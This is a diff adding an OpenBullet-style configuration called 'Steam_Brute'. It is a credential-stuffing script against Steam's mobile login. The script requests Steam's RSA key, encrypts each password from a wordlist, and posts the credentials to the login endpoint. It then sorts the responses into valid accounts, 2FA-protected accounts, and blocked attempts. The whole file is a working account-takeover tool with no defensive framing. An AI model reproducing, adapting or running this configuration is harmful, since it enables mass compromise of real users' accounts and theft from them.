@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "Steam_Brute",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-10-14T13:51:37.7667679+01:00",
+  "AdditionalInfo": "",
+  "Author": "Seliax",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://steamcommunity.com/login?oauth_client_id=DE45CD61&oauth_scope=read_profile%20write_profile%20read_client%20write_client&" 
+  
+  COOKIE "Cookie: mobileClientVersion=0 (2.1.3); mobileClient=android; Steam_Language=english" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; Google Nexus 4 - 4.1.1 - API 16 - 768x1280 Build/JRO03S) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/javascript, text/html, application/xml, text/xml, */*" 
+  HEADER "X-Requested-With: com.valvesoftware.android.steam.community" 
+  HEADER "Referer: https://steamcommunity.com/mobilelogin?oauth_client_id=DE45CD61&oauth_scope=read_profile%20write_profile%20read_client%20write_client" 
+
+#RSA REQUEST POST "https://steamcommunity.com/login/getrsakey" 
+  CONTENT "username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: mobileClientVersion=0 (2.1.3); mobileClient=android; Steam_Language=english" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; Google Nexus 4 - 4.1.1 - API 16 - 768x1280 Build/JRO03S) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/javascript, text/html, application/xml, text/xml, */*" 
+  HEADER "Referer: https://steamcommunity.com/mobilelogin?oauth_client_id=DE45CD61&oauth_scope=read_profile%20write_profile%20read_client%20write_client" 
+  HEADER "Host: steamcommunity.com" 
+
+#One PARSE "<SOURCE>" LR ",\"publickey_mod\":\"" "\",\"" -> VAR "ON" 
+
+#Two PARSE "<SOURCE>" LR "timestamp\":\"" "\"" -> VAR "TWO" 
+
+#THREE PARSE "<SOURCE>" LR "publickey_exp\":\"" "\"" -> VAR "THREE" 
+
+#RSAA FUNCTION RSA "<ON>" "<THREE>" "<PASS>" -> VAR "RSAURL" 
+
+#URLEn FUNCTION URLDecode "<RSAURL>" -> VAR "RSA" 
+
+#POST REQUEST POST "https://steamcommunity.com/login/dologin" 
+  CONTENT "username=<USER>&password=<RSA>&twofactorcode=&captchagid=-1&captcha_text=&emailsteamid=&emailauth=&rsatimestamp=<TWO>&remember_login=false&oauth_client_id=DE45CD61&oauth_scope=read_profile+write_profile+read_client+write_client&loginfriendlyname=%23login_emailauth_friendlyname_mobile&donotcache=1568591500" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; Google Nexus 4 - 4.1.1 - API 16 - 768x1280 Build/JRO03S) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/javascript, text/html, application/xml, text/xml, */*" 
+  HEADER "Referer: https://steamcommunity.com/mobilelogin?oauth_client_id=DE45CD61&oauth_scope=read_profile%20write_profile%20read_client%20write_client" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The account name or password that you have entered is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "\"login_complete\":true" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "requires_twofactor\":true" 
+    KEY "emailauth_needed\":true" 
+  KEYCHAIN Ban OR 
+    KEY "captcha_needed\":true" 
+    KEY "Verifying login information...<br><br>" 
+    KEY "There have been too many login failures from your network in a short time period" 
+
